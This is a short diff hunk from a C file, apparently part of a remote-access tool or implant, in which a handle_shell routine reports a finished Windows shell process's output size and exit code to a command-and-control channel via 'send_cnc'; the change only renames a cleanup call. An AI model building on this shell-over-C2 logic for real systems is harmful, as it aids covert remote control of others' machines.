@@ -84,7 +84,7 @@ void handle_shell()
         else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
         {
             send_cnc(&bytes_read, sizeof(bytes_read));
-            close_shell_process(&cmd);
+            close_shell(&cmd);
             send_cnc(&cmd.exit_code, sizeof(cmd.exit_code));
             break;
         }
